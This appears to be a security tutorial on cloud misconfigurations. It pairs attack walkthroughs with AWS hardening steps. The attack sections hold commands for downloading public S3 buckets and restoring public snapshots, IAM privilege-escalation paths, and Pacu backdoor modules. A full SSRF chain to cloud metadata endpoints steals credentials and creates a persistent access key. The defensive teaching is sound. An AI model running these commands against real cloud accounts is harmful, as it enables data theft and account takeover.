Cloud Misconfigurations

OWASP A05 · The #1 cause of cloud data breaches — exposed S3 buckets, overprivileged IAM, public snapshots, metadata abuse

Cloud misconfigurations are the leading cause of data breaches — not sophisticated zero-days, but simple mistakes: a bucket left public, a role with *:* permissions, a database open to the internet. The shared responsibility model means you configure security — and cloud defaults are often dangerously permissive.

Shared Responsibility — the misconfiguration zone
Cloud provider secures
Physical hardware, hypervisor, network fabric, data center security, managed service runtime
YOU secure (where breaches happen)
IAM policies, bucket ACLs, security groups, encryption settings, network ACLs, OS patching, secret management
Public S3 buckets
Open ACL / bucket policy allows world read — PII, backups, source code exposed
Overprivileged IAM
Action:* Resource:* on EC2 roles — full account takeover if instance is compromised
Public snapshots
EBS / RDS snapshots shared publicly — mount to own account, read all data
Open security groups
0.0.0.0/0 on SSH (22), RDP (3389), or database ports — brute force, direct access
Metadata SSRF
SSRF + 169.254.169.254 = IAM credential theft → full account access
Hardcoded secrets
AWS keys in GitHub, Docker images, Lambda env vars, CloudFormation templates

Public S3 buckets have exposed billions of records. They are trivially discoverable by guessing names and require no authentication to access when misconfigured.

Finding and enumerating public bucketsCritical
# Guess bucket names based on company aws s3 ls s3://corp-backup --no-sign-request aws s3 ls s3://corp-prod-data --no-sign-request aws s3 ls s3://corp.com-assets --no-sign-request # Automated discovery python3 s3scanner.py --bucket corp-backup # S3 URL patterns to try: # https://BUCKET.s3.amazonaws.com/ # https://s3.amazonaws.com/BUCKET/ # https://BUCKET.s3.REGION.amazonaws.com/ # Google dorks # site:s3.amazonaws.com "corp" # site:s3.amazonaws.com inurl:backup OR inurl:database # Once found — enumerate and download aws s3 ls s3://corp-backup --no-sign-request --recursive aws s3 sync s3://corp-backup . --no-sign-request # Look for: .env, *.sql, *.pem, config.json, *.bak, *.key

Public EBS and RDS snapshotsHigh
# Find public EBS snapshots for an account aws ec2 describe-snapshots \ --filters "Name=owner-id,Values=TARGET_ACCOUNT_ID" \ --query "Snapshots[?Public==\`true\`]" # Restore to your own account and mount aws ec2 create-volume --snapshot-id snap-XXXXXXXX \ --availability-zone us-east-1a --region us-east-1 # Mount → read entire disk: app code, .env, /etc/passwd, DB files # Find public RDS snapshots aws rds describe-db-snapshots --include-public \ --snapshot-type public # Restore to own RDS → full database access, credentials, PII

IAM misconfigurations are the most dangerous cloud issues. A single overprivileged role gives an attacker full account control after any initial foothold.

Overprivileged roles — common patternsCritical
# The worst offender: AdministratorAccess on EC2 instance role { "Effect":"Allow", "Action":"*", "Resource":"*" } # Compromise this EC2 via SSRF/RCE → full AWS account takeover # Common over-broad permissions found in real environments: Action: "s3:*" # read/write/delete ALL buckets Action: "iam:*" # create admin users, escalate privileges Action: "iam:PassRole" # pass any role to services → privesc Action: "ec2:*" # launch instances with new roles Action: "lambda:*" # deploy backdoor functions Action: "sts:AssumeRole" # assume any role in account # IAM privilege escalation paths: # iam:CreatePolicyVersion → create policy version with *:* # iam:AttachUserPolicy → attach AdminAccess to self # iam:CreateAccessKey → create persistent keys for any user # iam:PassRole + ec2:RunInstances → launch EC2 with admin role
Enumerating IAM after initial accessCritical
# Identify current identity aws sts get-caller-identity # List attached policies aws iam list-attached-user-policies --user-name USERNAME aws iam list-attached-role-policies --role-name ROLENAME aws iam get-policy-version --policy-arn ARN --version-id v1 # Automated enumeration — tests 300+ API calls python3 enumerate-iam.py --access-key AKIA... --secret-key ... # Pacu — AWS exploitation framework python3 pacu.py # Useful modules: # iam__enum_permissions → what can I do? # iam__privesc_scan → find escalation paths # s3__bucket_finder → enumerate all buckets # lambda__backdoor_all_functions → persist access
Hardcoded credentialsHigh

The instance metadata service is the jackpot of SSRF — reachable only from within the cloud instance, it returns temporary IAM credentials giving attacker-level access to the entire account.

Full chain: SSRF → metadata → account takeover
# Step 1: Find SSRF in web app GET /fetch?url=http://169.254.169.254/latest/meta-data/ # Step 2: Get IAM role name GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ # Returns: "ec2-prod-role" # Step 3: Get temporary credentials GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role # Returns: AccessKeyId, SecretAccessKey, Token, Expiration # Step 4: Use from attacker machine export AWS_ACCESS_KEY_ID=ASIAXYZ123456 export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI... export AWS_SESSION_TOKEN=AQoXnyc4... # Step 5: Escalate aws sts get-caller-identity aws s3 ls # all buckets aws secretsmanager list-secrets # DB passwords, API keys aws ec2 describe-instances # entire infrastructure map aws iam create-access-key --user-name admin # persistent backdoor
Metadata endpoints by cloud provider
# AWS EC2 (IMDSv1 — no token needed) http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/user-data # bootstrap scripts, passwords http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE # AWS EC2 (IMDSv2 — requires PUT token first) TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") curl -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/ # GCP (requires Metadata-Flavor: Google header) http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token http://metadata.google.internal/computeMetadata/v1/project/project-id # Azure (requires Metadata: true header) http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/ # ECS containers (task credentials) http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

① S3 — enable Block Public Access on every bucket Essential
Enable at both the account level and individual bucket level. This overrides any bucket ACL or policy that grants public access.
# Enable at account level (covers all buckets) aws s3control put-public-access-block \ --account-id 123456789012 \ --public-access-block-configuration \ "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true" # Audit — find any buckets that allow public access aws s3api list-buckets --query "Buckets[].Name" --output text | \ xargs -I{} aws s3api get-bucket-acl --bucket {} 2>/dev/null
② IAM — enforce least privilege, use SCPs Essential
Never use *:*. Grant only the specific actions on specific resources a role needs. Use Service Control Policies (SCPs) in AWS Organizations to enforce guardrails account-wide.
# Bad: overprivileged { "Effect":"Allow", "Action":"*", "Resource":"*" } # Good: least privilege { "Effect":"Allow", "Action": ["s3:GetObject","s3:PutObject"], "Resource": "arn:aws:s3:::my-app-bucket/*" } # SCP to deny dangerous actions org-wide { "Effect":"Deny", "Action": ["iam:CreateUser","iam:CreateAccessKey","ec2:*"], "Resource":"*", "Condition":{"StringNotEquals":{"aws:PrincipalArn":"arn:aws:iam::*:role/BreakGlass"}} } # Automated policy analysis pip install cloudsplaining cloudsplaining scan-policy-file --input policy.json
③ Enforce IMDSv2 — block credential theft via SSRF Critical for EC2
IMDSv2 requires a PUT request with a session token before any metadata can be read. SSRF via GET cannot obtain credentials — it would need to make a PUT first, which many SSRF vectors cannot do.
# Enforce IMDSv2 on existing instances aws ec2 modify-instance-metadata-options \ --instance-id i-1234567890abcdef0 \ --http-tokens required \ --http-endpoint enabled # Enforce in launch template / Terraform resource "aws_launch_template" "app" { metadata_options { http_tokens = "required" # IMDSv2 only http_endpoint = "enabled" } } # SCP to prevent IMDSv1 instances from launching { "Effect":"Deny", "Action":"ec2:RunInstances", "Condition":{"StringNotEquals": {"ec2:MetadataHttpTokens":"required"}} }
④ Enable CloudTrail + GuardDuty + AWS Config Detection
Logging and detection don't prevent misconfigs but catch exploitation in progress. GuardDuty specifically detects metadata credential abuse, unusual API calls, and compromised EC2 instances.
# Enable CloudTrail in all regions aws cloudtrail create-trail --name org-trail \ --s3-bucket-name my-cloudtrail-bucket \ --is-multi-region-trail --include-global-service-events # Enable GuardDuty (detects metadata abuse, credential theft) aws guardduty create-detector --enable # AWS Config — detect non-compliant resources # Managed rules to enable: # s3-bucket-public-read-prohibited # iam-root-access-key-check # ec2-imdsv2-check # restricted-ssh # rds-instance-public-access-check
⑤ Continuous posture management checklist
Run Prowler / ScoutSuite weekly for automated misconfiguration scanning  ·  Never use root account — enable MFA, create admin IAM user instead  ·  Rotate all IAM access keys every 90 days  ·  Delete unused IAM users, roles, and access keys immediately  ·  Enable encryption at rest (KMS) for all S3, EBS, RDS, Secrets Manager  ·  Security groups: no 0.0.0.0/0 on port 22, 3389, or database ports  ·  Use Secrets Manager / Parameter Store — never hardcode credentials  ·  Enable versioning + MFA delete on S3 buckets containing sensitive data
